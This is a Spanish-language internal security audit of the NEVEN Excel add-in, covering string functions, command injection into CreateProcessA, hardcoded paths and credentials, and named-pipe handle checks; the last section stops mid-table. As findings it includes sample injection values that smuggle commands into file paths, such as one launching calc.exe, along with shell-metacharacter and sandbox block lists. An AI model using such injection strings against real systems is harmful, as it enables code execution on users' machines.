# Hallazgos de Seguridad — Strings sin Verificación de Límites

**Tarea:** 2.1 Escanear funciones de manejo de strings sin verificación de límites  
**Fecha:** 2026-01-XX  
**Alcance:** Core/, Common/, ControlR/, ControlJulia/, ControlPython/, Ribbon/, PB/, tests/  
**Extensiones:** .cc, .h, .cpp, .hpp

---

## Resumen del Escaneo

### Patrones buscados

| Función insegura | Ocurrencias en código propio |
|------------------|------------------------------|
| `strcpy` | 0 |
| `sprintf` | 0 |
| `strcat` | 0 |
| `gets` | 0 |
| `sscanf` sin especificador de ancho | 1 |
| `wsprintf` / `_stprintf` / `wcscpy` / `wcscat` | 0 |

### Alternativas seguras encontradas

| Función segura | Ocurrencias |
|----------------|-------------|
| `sprintf_s` | 7 (ControlR, ControlJulia, ControlPython) |
| `snprintf` | 7 (Common/ContentPipeline, Common/NotebookExporter, Common/json11) |
| `strncpy_s` | Presente en Core/src/basic_functions.cc |
| `std::string` | >500 usos (predominante en todo el proyecto) |
| `std::stringstream` | Múltiples usos para formateo seguro |

### Conclusión General

El proyecto NEVEN **no utiliza funciones inseguras clásicas de strings** (`strcpy`, `sprintf`, `strcat`, `gets`). El código base usa predominantemente `std::string` para manejo de strings, con `sprintf_s` y `snprintf` para los casos donde se requiere formateo en buffers C. Solo se encontró **1 hallazgo** de severidad Alta relacionado con `sscanf`.

---

## Hallazgos

---

### [SEC-ALT-004] sscanf sin verificación de retorno en ControlPython

- **Archivo:** ControlPython/src/python_interface.cc
- **Línea:** 47
- **Contexto:**
```cpp
void PythonGetVersion(int32_t *major, int32_t *minor, int32_t *patch) {
  const char* version = Py_GetVersion();
  *major = 0; *minor = 0; *patch = 0;
  if (version) {
    sscanf(version, "%d.%d.%d", major, minor, patch);
  }
}
```
- **Severidad:** Alta
- **Categoría:** Seguridad > Strings sin verificación de límites
- **Descripción:** Se usa `sscanf` para parsear la versión de Python sin verificar el valor de retorno. Aunque los especificadores `%d` leen enteros (no strings, por lo que no hay riesgo de buffer overflow), el patrón es riesgoso porque: (1) no se valida que los 3 campos fueron parseados correctamente, (2) si `Py_GetVersion()` retorna un formato inesperado, los valores quedarían en 0 sin indicación de error, (3) `sscanf` es una función de la familia "unsafe" que debería evitarse en código nuevo.
- **Alternativa segura cercana:** El proyecto usa `sprintf_s` y `snprintf` extensivamente en otros módulos. En `ControlR/src/controlr.cc` se usa un patrón similar para la versión de R pero con `RGetVersion()` que retorna valores directamente.
- **Recomendación:** Verificar el valor de retorno de `sscanf` y manejar el caso de parseo incompleto:
```cpp
if (version) {
    if (sscanf(version, "%d.%d.%d", major, minor, patch) != 3) {
        *major = 0; *minor = 0; *patch = 0;
        // Log warning: unexpected Python version format
    }
}
```
Alternativamente, usar `std::sscanf` con verificación o parsear manualmente con `std::strtol`.

---

## Hallazgos Positivos (Fortalezas)

### [FOR-STR-001] Uso consistente de funciones seguras de strings

- **Archivo:** Todo el código base (Core/, Common/, ControlR/, ControlJulia/, ControlPython/, Ribbon/)
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Strings sin verificación de límites
- **Descripción:** El proyecto **no contiene ningún uso** de las funciones clásicas inseguras `strcpy`, `sprintf`, `strcat`, ni `gets` en su código propio. Todas las operaciones de formateo en buffers C usan las variantes seguras de MSVC (`sprintf_s`, `strncpy_s`) o la función estándar con tamaño (`snprintf` con `sizeof`). El manejo de strings se realiza predominantemente con `std::string`, eliminando la clase entera de vulnerabilidades de buffer overflow por strings.

### [FOR-STR-002] snprintf con sizeof consistente

- **Archivo:** Common/ContentPipeline.cc:170, Common/NotebookExporter.cc:134, Common/json11/json11.cpp:60,69,97,331,333
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Strings sin verificación de límites
- **Descripción:** Todos los usos de `snprintf` en el proyecto pasan `sizeof(buf)` o `sizeof buf` como segundo argumento, garantizando que nunca se escribe más allá del buffer. Ejemplo: `snprintf(hex, sizeof(hex), "%%%02X", (unsigned char)c)`.

### [FOR-STR-003] sprintf_s como estándar para formateo en buffers

- **Archivo:** ControlR/src/controlr.cc:627, ControlJulia/src/control_julia.cc:571,598,601, ControlPython/src/control_python.cc:479,495,498
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Strings sin verificación de límites
- **Descripción:** El proyecto usa `sprintf_s` (la variante segura de MSVC que valida el tamaño del buffer en tiempo de ejecución) en lugar de `sprintf` para todos los casos de formateo en buffers de tamaño fijo. `sprintf_s` invoca el invalid parameter handler si el buffer es insuficiente, previniendo overflows silenciosos.

### [FOR-STR-004] std::string como tipo predominante para strings

- **Archivo:** Todo el código base
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Strings sin verificación de límites
- **Descripción:** El proyecto usa `std::string` como tipo principal para manejo de strings en más del 95% de los casos. Los buffers `char[]` se usan únicamente para interacción con APIs de Windows (GetModuleFileNameA, GetEnvironmentVariableA, OPENFILENAMEA) donde son requeridos por la API, y siempre con tamaño `MAX_PATH` y límites explícitos.

---

## Nota sobre Exclusiones

Los siguientes archivos fueron excluidos del análisis por ser código de terceros:
- `Build/_deps/protobuf-src/` — Código fuente de Protocol Buffers (Google), contiene `sprintf` y `sscanf` pero es código externo no modificable.
- `Common/json11/json11.cpp` — Librería JSON de Dropbox (MIT), usa `snprintf` de forma segura con `sizeof buf`.
- `PB/variable.pb.cc` — Código generado por protoc, no editable manualmente.

---
---

# Hallazgos de Seguridad — Inyección de Comandos en Llamadas de Sistema

**Tarea:** 2.2 Escanear datos de usuario pasados a llamadas de sistema sin sanitización  
**Fecha:** 2026-01-XX  
**Alcance:** Core/, Common/, ControlR/, ControlJulia/, ControlPython/, Ribbon/, tests/  
**Extensiones:** .cc, .h

---

## Resumen del Escaneo

### Funciones de sistema buscadas

| Función | Ocurrencias en código propio | Con datos de usuario |
|---------|------------------------------|----------------------|
| `CreateProcessA` | 6 | 3 |
| `CreateProcessW` | 0 | 0 |
| `ShellExecuteA` | 6 | 1 (mitigado) |
| `ShellExecuteW` / `ShellExecuteExW` | 0 | 0 |
| `system()` | 0 | 0 |
| `_popen` / `_wpopen` | 0 | 0 |
| `WinExec` | 0 | 0 |

### Resumen de Riesgo

- **2 hallazgos Críticos**: Datos de celda Excel pasan directamente a `CreateProcessA` sin sanitización de caracteres de inyección.
- **1 hallazgo Alto**: Datos de celda Excel pasan a `CreateProcessA` con sanitización parcial (incompleta).
- **1 hallazgo Medio**: Datos de archivo de configuración JSON pasan a `CreateProcessA` sin validación.

### Flujo de datos identificado

```
Excel Cell (usuario) → LPXLOPER12 → Convert::XLOPERToString() → std::string
  → concatenación en command line → CreateProcessA()
```

---

## Hallazgos

---

### [SEC-CRI-001] Inyección de comandos en RJ_Q (Quarto render) via ruta de archivo de celda Excel

- **Archivo:** Core/src/basic_functions.cc
- **Línea:** 387
- **Contexto:**
```cpp
// Línea 353: qmd_path proviene directamente de celda Excel
std::string qmd_path = Convert::XLOPERToString(file_path);
// ...
// Línea 387: se concatena sin sanitización en command line
std::string command = "\"" + quarto_exe + "\" render \"" + qmd_path + "\" --to html";
// Línea 397-399:
strncpy_s(cmd_buf, command.c_str(), sizeof(cmd_buf) - 1);
if (!CreateProcessA(nullptr, cmd_buf, nullptr, nullptr, FALSE,
                     CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
```
- **Severidad:** Crítica
- **Categoría:** Seguridad > Inyección de comandos
- **Descripción:** La función `RJ_Q` (expuesta como `=NEVEN.q()` en Excel) recibe una ruta de archivo `.qmd` directamente desde una celda de Excel (`LPXLOPER12 file_path`). Este valor se convierte a `std::string` y se concatena directamente en una línea de comandos que se pasa a `CreateProcessA`. Un atacante que controle el contenido de la celda puede inyectar comandos arbitrarios usando caracteres como `"`, `&`, `|`, o `\n`. Por ejemplo, una celda con el valor `file.qmd" & calc.exe & "` ejecutaría `calc.exe` como proceso separado. La única validación presente es verificar que el archivo existe (`GetFileAttributesA`), pero esto no previene inyección ya que el path malicioso puede contener comandos adicionales después de un archivo válido.
- **Recomendación:** Implementar sanitización de la ruta antes de construir el command line:
  1. Usar `ValidateInputSecurity()` de `QuartoService` (que ya bloquea `|`, `&`, `;`, `` ` ``, `<`, `>`) o una función equivalente.
  2. Validar que la ruta no contiene caracteres de control (`\n`, `\r`), comillas dobles embebidas, ni secuencias `$()`.
  3. Considerar migrar a la versión segura `QuartoService::Render()` que ya implementa estas validaciones.
  4. Alternativamente, usar `CreateProcessA` con el primer parámetro (`lpApplicationName`) apuntando al ejecutable y el segundo solo con argumentos, lo que previene ejecución de comandos shell.

---

### [SEC-CRI-002] Inyección de comandos en ContentPipeline::ConvertWithPandoc via ruta de archivo de celda Excel

- **Archivo:** Common/ContentPipeline.cc
- **Línea:** 376
- **Contexto:**
```cpp
// file_path proviene de RJ_View → Convert::XLOPERToString(content_or_path)
std::string ContentPipeline::ConvertWithPandoc(const std::string& file_path,
                                                const std::string& from_format) {
    std::string pandoc_path = FindPandoc();
    // ...
    // Línea 370: concatenación directa sin sanitización
    std::string cmd = "\"" + pandoc_path + "\" --from=" + from_format +
                      " --to=html --standalone \"" + file_path + "\"";
    // Línea 376-379:
    BOOL created = CreateProcessA(
        NULL,
        const_cast<char*>(cmd.c_str()),
        NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
```
- **Severidad:** Crítica
- **Categoría:** Seguridad > Inyección de comandos
- **Descripción:** La función `ConvertWithPandoc` es invocada desde `RJ_View` (expuesta como `=NEVEN.v()` en Excel) cuando el usuario pasa una ruta a un archivo `.docx` o `.doc`. El parámetro `file_path` proviene directamente de la celda Excel sin ninguna sanitización de caracteres de inyección de comandos. La ruta se concatena en un command line que se pasa a `CreateProcessA` con `lpApplicationName = NULL`, lo que permite al shell de Windows interpretar metacaracteres. Un atacante puede inyectar comandos usando `"`, `&`, `|`, `;` o caracteres de nueva línea en el nombre del archivo. A diferencia de `QuartoService::Render()`, esta función **no tiene ninguna validación de seguridad** — solo verifica que el archivo existe con `GetFileAttributesA`.
- **Recomendación:**
  1. Agregar validación de caracteres peligrosos antes de construir el command line (bloquear `|`, `&`, `;`, `` ` ``, `<`, `>`, `"`, `\n`, `\r`, `$()`).
  2. Pasar `pandoc_path.c_str()` como primer argumento de `CreateProcessA` (`lpApplicationName`) para que Windows no interprete el segundo argumento como comando shell.
  3. Escapar o rechazar comillas dobles en `file_path`.
  4. Considerar usar una allowlist de caracteres válidos para rutas de archivo (alfanuméricos, `\`, `/`, `.`, `-`, `_`, espacios, `:` para drive letter).

---

### [SEC-ALT-005] Sanitización incompleta en QuartoService::SpawnRender — no bloquea todos los vectores de inyección

- **Archivo:** Common/QuartoService.cc
- **Línea:** 394 (CreateProcessA), 36-56 (ValidateInputSecurity)
- **Contexto:**
```cpp
// ValidateInputSecurity bloquea: | & ; ` < > y ".."
// PERO NO bloquea: " (comillas dobles), \n, \r, $(), %VAR%
bool QuartoService::ValidateInputSecurity(const std::string& input, std::string& error_msg) {
    // Block path traversal
    if (input.find("..") != std::string::npos) { ... }
    // Block command injection characters
    const char blocked_chars[] = { '|', '&', ';', '`', '<', '>' };
    for (char c : blocked_chars) { ... }
    return true;
}

// SpawnRender construye:
std::string cmd = "\"" + quarto_path_ + "\" render \"" + resolved_path + "\" --to " + format;
// ... luego:
BOOL created = CreateProcessA(NULL, cmd_buf.data(), ...);
```
- **Severidad:** Alta
- **Categoría:** Seguridad > Inyección de comandos
- **Descripción:** `QuartoService::Render()` implementa `ValidateInputSecurity()` que bloquea los metacaracteres más comunes (`|`, `&`, `;`, `` ` ``, `<`, `>`). Sin embargo, la sanitización es **incompleta**:
  - **No bloquea comillas dobles (`"`)**: Un path como `C:\test" --execute-code "malicious` podría escapar del entrecomillado y agregar argumentos arbitrarios a Quarto.
  - **No bloquea caracteres de nueva línea (`\n`, `\r`)**: En algunos contextos de Windows, un newline puede separar comandos.
  - **No bloquea expansión de variables (`%VAR%`)**: Windows expande `%COMSPEC%` y similares en command lines.
  - **No bloquea `$()`**: Aunque menos relevante en Windows cmd, es un vector en PowerShell.
  - El `format` se valida contra una allowlist (`html`, `pdf`, `docx`) lo cual es correcto.
  - La validación de extensión (`.qmd`) limita el ataque pero no lo elimina.
- **Recomendación:**
  1. Agregar `"` (comilla doble), `\n`, `\r`, `%` a la lista de caracteres bloqueados.
  2. Usar una allowlist de caracteres permitidos en rutas en lugar de una blocklist.
  3. Pasar `quarto_path_.c_str()` como `lpApplicationName` en `CreateProcessA` para evitar interpretación shell.
  4. Considerar canonicalizar la ruta con `GetFullPathNameA` y validar que está dentro de directorios permitidos.

---

### [SEC-MED-001] Datos de archivo de configuración JSON pasan a CreateProcessA sin validación

- **Archivo:** Core/src/language_service.cc
- **Línea:** 350 (CreateProcessA), 753 (command_arguments_)
- **Contexto:**
```cpp
// language_desc.cc:50 — command_arguments_ se lee del JSON de configuración
if (!item["command_arguments"].is_null())
    command_arguments_ = item["command_arguments"].string_value();

// language_service.cc:753-758 — se concatena en command line
std::string arguments = language_descriptor_.command_arguments_;
InterpolateString(arguments);
std::stringstream command;
command << "\"" << child_path_ << "\" -p " << pipe_name_ << " " << arguments;

// language_service.cc:350
if (!CreateProcessA(0, command_line, 0, 0, FALSE, creation_flags, 0, 0, &si, &process_info_))
```
- **Severidad:** Media
- **Categoría:** Seguridad > Inyección de comandos
- **Descripción:** El `command_arguments_` y `child_path_` para lanzar los procesos hijos (ControlR.exe, ControlJulia.exe, ControlPython.exe) se leen del archivo de configuración JSON (`neven-config.json`). Si un atacante puede modificar este archivo (acceso local al directorio `C:\NEVEN\`), podría inyectar comandos arbitrarios en el `command_line` pasado a `CreateProcessA`. El riesgo es **medio** porque: (1) requiere acceso local al filesystem, (2) el archivo de configuración está en un directorio fijo (`C:\NEVEN\`), (3) un atacante con acceso local ya tiene capacidad de ejecución directa. Sin embargo, en escenarios de escalación de privilegios (si el XLL corre con permisos elevados), esto podría ser explotable.
- **Recomendación:**
  1. Validar que `command_arguments_` solo contiene caracteres esperados (flags como `-s`, `--sysimage`, rutas).
  2. Validar que `child_path_` apunta a un ejecutable conocido (ControlR.exe, ControlJulia.exe, ControlPython.exe).
  3. Considerar verificar la integridad del archivo de configuración (hash o firma).
  4. Usar `lpApplicationName` en `CreateProcessA` para separar el ejecutable de los argumentos.

---

## Hallazgos Positivos (Fortalezas)

### [FOR-CMD-001] Zombie cleanup usa comandos hardcodeados — sin riesgo de inyección

- **Archivo:** Core/src/rj2xcl.cc:456-468
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Inyección de comandos
- **Descripción:** El código de limpieza de procesos zombi usa un array de strings constantes hardcodeados (`"taskkill /F /IM ControlR.exe /T"`, etc.) que se copian a un buffer local antes de pasarse a `CreateProcessA`. No hay posibilidad de inyección ya que ningún dato externo influye en estos comandos.

### [FOR-CMD-002] Ribbon ShellExecute usa rutas completamente hardcodeadas

- **Archivo:** Ribbon/ribbon_connect.h:331-381
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Inyección de comandos
- **Descripción:** Todas las invocaciones de `ShellExecuteA` en el Ribbon usan rutas completamente hardcodeadas en el código fuente (`"C:\\NEVEN\\"`, `"C:\\NEVEN\\neven-config.json"`, `"Rgui.exe"`, `"julia.exe"`). No hay posibilidad de inyección de comandos ya que ningún dato de usuario influye en los parámetros.

### [FOR-CMD-003] PlutoManager construye comando internamente sin datos de usuario directos

- **Archivo:** Common/PlutoManager.cc:317-329
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Inyección de comandos
- **Descripción:** `PlutoManager::BuildPlutoCommand()` construye el comando de Julia usando `julia_path_` (obtenido de configuración/discovery) y un puerto numérico (`port_`). Los argumentos de Pluto son strings literales hardcodeados. El riesgo de inyección es mínimo ya que no hay datos de usuario directos en la construcción del comando.

### [FOR-CMD-004] QuartoService implementa validación de seguridad de entrada (parcial pero presente)

- **Archivo:** Common/QuartoService.cc:35-56
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Inyección de comandos
- **Descripción:** A diferencia de `RJ_Q` y `ConvertWithPandoc`, `QuartoService::Render()` implementa `ValidateInputSecurity()` que bloquea path traversal (`..`) y los metacaracteres de shell más comunes (`|`, `&`, `;`, `` ` ``, `<`, `>`). También valida la extensión del archivo (`.qmd`) y el formato contra una allowlist (`html`, `pdf`, `docx`). Aunque la sanitización es incompleta (ver SEC-ALT-005), demuestra conciencia de seguridad y un patrón que debería extenderse a las otras funciones.

### [FOR-CMD-005] No se usa system(), _popen ni WinExec en todo el código propio

- **Archivo:** Todo el código base (Core/, Common/, ControlR/, ControlJulia/, ControlPython/, Ribbon/)
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Inyección de comandos
- **Descripción:** El proyecto **no utiliza** las funciones más peligrosas para ejecución de comandos: `system()`, `_popen()`, `_wpopen()` ni `WinExec()`. Todas las invocaciones de procesos externos usan `CreateProcessA` que, aunque requiere cuidado con la construcción del command line, no invoca un shell intermedio (cmd.exe) por defecto, reduciendo la superficie de ataque comparado con `system()`.

### [FOR-CMD-006] SandboxVerifier bloquea system/shell en código de usuario R/Julia/Python

- **Archivo:** Common/SandboxVerifier.cc:82-153
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Inyección de comandos
- **Descripción:** El `SandboxVerifier` implementa una blocklist exhaustiva que previene que scripts de usuario ejecuten comandos del sistema operativo a través de los motores embebidos. Bloquea `system()`, `system2()`, `shell()` en R; `run()`, `@ccall` en Julia; y `os.system()`, `os.popen()`, `subprocess.*` en Python. Esto mitiga el riesgo de que un usuario malicioso use las funciones `=NEVEN.r()` o `=NEVEN.j()` para ejecutar comandos OS indirectamente.

---

## Nota sobre Exclusiones

Los siguientes archivos con `CreateProcessA` fueron excluidos del análisis por ser código de terceros:
- `Build/_deps/protobuf-src/src/google/protobuf/compiler/subprocess.cc` — Código de Protocol Buffers (Google).
- `Build/_deps/protobuf-src/third_party/googletest/` — Google Test framework.
- `Build/_deps/googletest-src/` — Google Test framework.

---

# Hallazgos de Seguridad — Credenciales, Tokens y Rutas Sensibles Hardcodeadas

**Tarea:** 2.3 Escanear credenciales, tokens o rutas sensibles hardcodeadas  
**Fecha:** 2026-01-XX  
**Alcance:** Core/, Common/, ControlR/, ControlJulia/, ControlPython/, Console/, Ribbon/, startup/, libreria/  
**Extensiones:** .cc, .h, .cpp, .hpp, .py, .R, .jl, .ts, .js, .json

---

## Resumen del Escaneo

### Patrones buscados — Credenciales y Tokens

| Patrón | Ocurrencias en código propio |
|--------|------------------------------|
| Strings con "password" / "passwd" | 0 (solo en test de path traversal: `"..\\..\\etc\\passwd"`) |
| Strings con "secret" | 0 (solo en test de sandbox: `"secret.txt"`) |
| Strings con "token" | 0 en C++ propio (solo `utils:::.CompletionEnv$token` en R — es token de autocompletado, no credencial) |
| Strings con "api_key" / "apikey" | 0 hardcodeados (campo `"apiKey": ""` en config está vacío por diseño) |
| Strings con "credential" / "auth" | 0 |
| Connection strings (Server=, Data Source=, jdbc:) | 0 |
| URLs con credenciales embebidas (user:pass@host) | 0 |
| Claves privadas (BEGIN PRIVATE KEY) | 0 |
| Certificados embebidos (BEGIN CERTIFICATE) | 0 |
| Strings Base64 sospechosos (>40 chars) | 0 (solo hashes SHA-256 en tests de seguridad) |

### Patrones buscados — Rutas Absolutas Hardcodeadas

| Ruta | Ocurrencias | Contexto |
|------|-------------|----------|
| `C:\NEVEN\` | 8+ | Directorio de producción (por diseño) |
| `C:\RJ2XCL\` | 3 | Directorio legacy de datos/crashes |
| `C:\Quarto\` | 2 | Ruta de instalación de Quarto |
| `C:\Program Files\R\` | 3 | Rutas de búsqueda de R GUI |
| Rutas de usuario (`%USERPROFILE%`) | Múltiples | Resueltas via env vars (correcto) |

### Conclusión General

El proyecto NEVEN **no contiene credenciales, tokens, API keys ni secretos hardcodeados** en su código fuente. El campo `apiKey` en `neven-config.json` está vacío por defecto y se llena por el usuario en tiempo de ejecución. Las rutas absolutas hardcodeadas son **por diseño** del proyecto (directorio de producción fijo `C:\NEVEN\`) y no representan exposición de información sensible. Se identificó **1 hallazgo de severidad Baja** relacionado con rutas legacy que exponen estructura interna del sistema, y **1 hallazgo Informativo** sobre el manejo del campo API key en configuración.

---

## Hallazgos

---

### [SEC-BAJ-001] Rutas absolutas hardcodeadas con nombre legacy "RJ2XCL" exponen estructura interna

- **Archivo:** Common/CrashHandler.cc:249, Common/ContentPipeline.cc:49,199
- **Línea:** 249 (CrashHandler), 49 y 199 (ContentPipeline)
- **Contexto:**
```cpp
// CrashHandler.cc:249
std::string CrashHandler::GetCrashDirectory() {
    return "C:\\RJ2XCL\\crashes\\";
}

// ContentPipeline.cc:49, 199
std::string temp_dir = "C:\\RJ2XCL\\webview2-data\\";
CreateDirectoryA(temp_dir.c_str(), nullptr);
```
- **Severidad:** Baja
- **Categoría:** Seguridad > Credenciales y rutas sensibles
- **Descripción:** Tres ubicaciones en el código usan la ruta hardcodeada `C:\RJ2XCL\` (nombre interno legacy del proyecto) para almacenar crash dumps y datos temporales de WebView2. Aunque no exponen credenciales, estas rutas: (1) revelan la estructura interna del sistema de archivos a cualquiera que inspeccione el binario, (2) usan el nombre legacy `RJ2XCL` en lugar del nombre actual `NEVEN`, (3) no son configurables — si el directorio no existe o no tiene permisos, la operación falla silenciosamente, (4) escriben datos potencialmente sensibles (crash dumps con stack traces, contenido HTML temporal) en una ubicación fija predecible.
- **Recomendación:**
  1. Migrar estas rutas a usar la variable de entorno `NEVEN_HOME` o `RJ2XCL_HOME` como ya hacen los scripts de startup.
  2. Renombrar de `C:\RJ2XCL\` a `C:\NEVEN\` para consistencia con el nombre actual del proyecto.
  3. Verificar permisos del directorio antes de escribir crash dumps.
  4. Considerar usar `%LOCALAPPDATA%\NEVEN\` como alternativa más estándar en Windows.

---

### [SEC-INF-001] Campo apiKey en neven-config.json — diseño correcto pero requiere documentación de seguridad

- **Archivo:** Install/neven-config.json:43, startup/startup.py:600, libreria/PYTHON/ai_functions.py:48
- **Línea:** N/A (patrón distribuido)
- **Contexto:**
```json
// Install/neven-config.json
"AI": {
    "enabled": true,
    "provider": "lmstudio",
    "apiKey": "",
    ...
}
```
```python
# startup/startup.py:600
api_key = ai_config.get("apiKey", "")

# startup/startup.py:733-735
if config["provider"] == "azure":
    headers["api-key"] = config["apiKey"]
else:
    headers["Authorization"] = f"Bearer {config['apiKey']}"
```
- **Severidad:** Informativa
- **Categoría:** Seguridad > Credenciales y rutas sensibles
- **Descripción:** El proyecto implementa un campo `apiKey` en `neven-config.json` para integración con servicios de IA (OpenAI, Azure, Ollama, LM Studio). El campo está **vacío por defecto** en la plantilla de instalación, lo cual es correcto. Sin embargo: (1) cuando el usuario configura su API key, esta queda almacenada en texto plano en `C:\NEVEN\neven-config.json`, (2) el archivo de configuración no tiene protección especial de permisos, (3) la función `_mask_api_key()` en startup.py demuestra conciencia de seguridad al enmascarar la key en logs (solo muestra los primeros 4 caracteres). **No es un hallazgo de vulnerabilidad** ya que el campo está vacío por defecto y el almacenamiento en texto plano es el patrón estándar para configuraciones locales de API keys en herramientas de desarrollo.
- **Recomendación:**
  1. Documentar en el manual que `neven-config.json` puede contener API keys y no debe compartirse.
  2. Agregar `neven-config.json` al `.gitignore` del usuario (ya está excluido del repo del proyecto).
  3. Considerar soporte para variables de entorno como alternativa: `"apiKey": "$NEVEN_AI_KEY"`.
  4. Verificar que crash dumps y logs no incluyan el valor de la API key.

---

## Hallazgos Positivos (Fortalezas)

### [FOR-CRE-001] Ausencia total de credenciales hardcodeadas en código fuente

- **Archivo:** Todo el código base (Core/, Common/, ControlR/, ControlJulia/, ControlPython/, Ribbon/, Console/, startup/, libreria/)
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Credenciales y rutas sensibles
- **Descripción:** El proyecto **no contiene ninguna credencial, contraseña, token de API, clave privada ni secreto hardcodeado** en su código fuente. Se escanearon todos los archivos de código propio (.cc, .h, .py, .R, .jl, .ts, .js) buscando patrones de credenciales (password, secret, token, api_key, Bearer, sk-, connection strings, Base64 sospechoso, BEGIN PRIVATE KEY) sin encontrar ningún valor real expuesto. Los únicos usos de estas palabras son: (1) nombres de campos de configuración (`"apiKey": ""`), (2) strings de test (`"secret.txt"`, `"..\\etc\\passwd"`), (3) tokens de autocompletado de R (`CompletionEnv$token`).

### [FOR-CRE-002] API key vacía por defecto en plantilla de configuración

- **Archivo:** Install/neven-config.json:43
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Credenciales y rutas sensibles
- **Descripción:** La plantilla de instalación de `neven-config.json` distribuye el campo `apiKey` con valor vacío (`""`). Esto asegura que ningún secreto se distribuye con el software y que el usuario debe configurar su propia clave. El provider por defecto es `lmstudio` (local), que no requiere API key.

### [FOR-CRE-003] Enmascaramiento de API key en logs implementado

- **Archivo:** startup/startup.py:815-830
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Credenciales y rutas sensibles
- **Descripción:** La función `_mask_api_key(key)` enmascara la API key para logging seguro, mostrando solo los primeros 4 caracteres (`"sk-****"`). Esto demuestra conciencia de seguridad y previene la exposición accidental de credenciales en archivos de log.

### [FOR-CRE-004] Rutas de producción resueltas via variables de entorno en scripts

- **Archivo:** startup/startup.py:583, startup/startup.jl:195, libreria/R/R4XCL-GR-QuickPlot.R:7, libreria/PYTHON/ai_functions.py:31
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Credenciales y rutas sensibles
- **Descripción:** Los scripts de startup y librería resuelven el directorio home del proyecto usando variables de entorno con fallback: `os.environ.get("NEVEN_HOME", os.environ.get("RJ2XCL_HOME", "C:\\NEVEN\\"))` en Python, `get(ENV, "NEVEN_HOME", "C:\\NEVEN")` en Julia, y `Sys.getenv("NEVEN_HOME", "C:/NEVEN")` en R. Este patrón permite configuración flexible mientras mantiene un fallback funcional para la instalación estándar.

### [FOR-CRE-005] SandboxVerifier bloquea acceso a variables de entorno desde scripts de usuario

- **Archivo:** Common/SandboxVerifier.cc:181-183
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Credenciales y rutas sensibles
- **Descripción:** El `SandboxVerifier` bloquea explícitamente el acceso a variables de entorno desde scripts de usuario Python (`os.environ[`, `os.putenv(`), previniendo que código malicioso ejecutado via `=NEVEN.p()` pueda leer o modificar variables de entorno que podrían contener tokens o credenciales del sistema.

---

## Nota sobre Rutas Hardcodeadas por Diseño

Las siguientes rutas absolutas hardcodeadas son **intencionales y por diseño** del proyecto. El directorio de producción `C:\NEVEN\` es una decisión arquitectónica documentada:

| Archivo | Ruta | Propósito |
|---------|------|-----------|
| Ribbon/ribbon_connect.h:374 | `C:\NEVEN\` | Abrir directorio de scripts (ShellExecute) |
| Ribbon/ribbon_connect.h:379 | `C:\NEVEN\neven-config.json` | Abrir configuración (ShellExecute) |
| Ribbon/ribbon_connect.h:324-326 | `C:\Program Files\R\R-4.x.x\bin\x64\Rgui.exe` | Búsqueda de R GUI |
| Core/src/basic_functions.cc:372-373 | `C:\Quarto\bin\quarto.exe`, `C:\Program Files\Quarto\...` | Búsqueda de Quarto |
| Common/ContentPipeline.cc:318 | `C:\Quarto\bin\pandoc.exe` | Fallback para Pandoc |

Estas rutas no exponen información sensible y son necesarias para el funcionamiento del add-in en su entorno de producción Windows.

---

## Nota sobre Exclusiones

Los siguientes archivos fueron excluidos del análisis:
- `Build/` — Código de terceros (Protocol Buffers, Google Test, WebView2 SDK).
- `Common/json11/` — Librería JSON de Dropbox (MIT).
- `PB/variable.pb.cc` — Código generado por protoc.
- `tests/` — Archivos de test que usan strings como "secret.txt", "passwd" en contexto de pruebas de seguridad (no son credenciales reales).
- `docs/api/html/jquery.js` — Librería jQuery minificada (terceros).
- `Console/data/themes/` — Archivos de temas que usan "token" como categoría de syntax highlighting.


---

# Hallazgos de Seguridad — Validación de Handles de Named Pipe antes de ReadFile/WriteFile

**Tarea:** 2.4 Verificar validación de handles de Named_Pipe antes de ReadFile/WriteFile  
**Fecha:** 2026-01-XX  
**Alcance:** Core/src/language_service.cc, Common/pipe.cc, Common/pipe.h, Common/UniqueHandle.h, Common/QuartoService.cc, tests/mock_engine_backend.cc, ControlR/src/controlr.cc  
**Extensiones:** .cc, .h

---

## Resumen del Escaneo

### Operaciones de lectura/escritura en pipes identificadas

| Archivo | Función | Operación | Handle | Validación previa |
|---------|---------|-----------|--------|-------------------|
| Core/src/language_service.cc:561 | `Call()` | `WriteFile(pipe_handle_, ...)` | `UniqueHandle pipe_handle_` | Solo `connected_` flag |
| Core/src/language_service.cc:590 | `Call()` | `ReadFile(pipe_handle_, ...)` | `UniqueHandle pipe_handle_` | Solo `connected_` flag |
| Core/src/language_service.cc:619 | `Call()` (callback write) | `WriteFile(pipe_handle_, ...)` | `UniqueHandle pipe_handle_` | Ninguna directa |
| Core/src/language_service.cc:622 | `Call()` (restart read) | `ReadFile(pipe_handle_, ...)` | `UniqueHandle pipe_handle_` | Ninguna directa |
| Core/src/language_service.cc:636 | `Call()` (MORE_DATA) | `ReadFile(pipe_handle_, ...)` | `UniqueHandle pipe_handle_` | Ninguna directa |
| Core/src/language_service.cc:247 | `RunCallbackThread()` | `ReadFile(callback_pipe_handle, ...)` | Raw `HANDLE` | `INVALID_HANDLE_VALUE` check post-CreateFileA |
| Core/src/language_service.cc:281 | `RunCallbackThread()` | `WriteFile(callback_pipe_handle, ...)` | Raw `HANDLE` | Implícita (dentro de bloque `else` de validación) |
| Common/pipe.cc:69 | `StartRead()` | `ReadFile(handle_, ...)` | Raw `HANDLE handle_` | `reading_`, `error_`, `connected_` flags |
